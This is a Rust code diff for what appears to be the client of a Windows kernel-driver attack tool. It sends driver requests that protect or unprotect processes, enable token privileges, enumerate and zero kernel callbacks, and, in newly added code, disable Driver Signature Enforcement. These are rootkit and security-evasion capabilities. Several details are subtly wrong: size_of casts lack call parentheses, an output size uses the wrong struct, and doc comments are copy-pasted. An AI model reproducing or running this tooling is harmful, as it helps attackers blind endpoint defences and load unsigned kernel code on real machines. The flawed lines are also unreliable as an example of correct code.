@@ -1,10 +1,10 @@
 use std::{mem::size_of, ptr::null_mut};
 use winapi::{um::{ioapiset::DeviceIoControl}, ctypes::c_void};
-use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST};
+use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement};
 
 /// Protect a process as PsProtectedSignerWinTcb
 pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
-    let bytes: u32 = 0;
+    let mut bytes: u32 = 0;
     
     let mut target_process = TargetProcess {
         process_id: process_id,
@@ -17,7 +17,7 @@ pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
         size_of::<TargetProcess> as u32,
         null_mut(),
         0,
-        bytes as *mut u32,
+        &mut bytes,
         null_mut())
     };
 
@@ -28,7 +28,7 @@ pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
 
 /// Remove the protection of a process
 pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
-    let bytes: u32 = 0;
+    let mut bytes: u32 = 0;
     
     let mut target_process = TargetProcess {
         process_id: process_id,
@@ -41,7 +41,7 @@ pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
         size_of::<TargetProcess> as u32,
         null_mut(),
         0,
-        bytes as *mut u32,
+        &mut bytes,
         null_mut())
     };
 
@@ -52,7 +52,7 @@ pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
 
 /// Remove the protection of a process
 pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
-    let bytes: u32 = 0;
+    let mut bytes: u32 = 0;
     
     let mut target_process = TargetProcess {
         process_id: process_id,
@@ -65,7 +65,7 @@ pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
         size_of::<TargetProcess> as u32,
         null_mut(),
         0,
-        bytes as *mut u32,
+        &mut bytes,
         null_mut())
     };
 
@@ -108,7 +108,7 @@ pub fn enumerate_callbacks(driver_handle: *mut c_void) {
 
 /// Remove the protection of a process
 pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
-    let bytes: u32 = 0;
+    let mut bytes: u32 = 0;
     
     let mut target = TargetCallback {
         index: index,
@@ -121,11 +121,50 @@ pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
         size_of::<TargetProcess> as u32,
         null_mut(),
         0,
-        bytes as *mut u32,
+        &mut bytes,
         null_mut())
     };
 
     if device_io_control_result == 0 {
         panic!("[-] Failed to call DeviceIoControl");
+    }
+}
+
+/// Enable Driver Signature Enforcement (DSE)
+pub fn enable_or_disable_dse(driver_handle: *mut c_void, dse_state: bool) {
+    let mut bytes: u32 = 0;
+    
+    let mut dse = DriverSignatureEnforcement {
+        address: 0,
+        is_enabled: true,
+    };
+
+    if dse_state {
+        dse.is_enabled = true;
+    } else {
+        dse.is_enabled = false;
+    }
+
+    let device_io_control_result = unsafe { 
+        DeviceIoControl(driver_handle,
+        IOCTL_DSE_ENABLE_DISABLE_REQUEST,
+        &mut dse as *mut _ as *mut c_void,
+        size_of::<DriverSignatureEnforcement> as u32,
+        &mut dse as *mut _ as *mut c_void,
+        size_of::<CallBackInformation>() as u32,
+        &mut bytes,
+        null_mut())
+    };
+
+    if device_io_control_result == 0 {
+        panic!("[-] Failed to call DeviceIoControl");
+    }
+
+    println!("Bytes returned: {:?}", bytes);
+    
+    if dse.is_enabled {
+        println!("[+] Driver Signature Enforcement (DSE) enabled: {:#x}", dse.address);
+    } else {
+        println!("[+] Driver Signature Enforcement (DSE) disabled: {:#x}", dse.address);
     }
 }
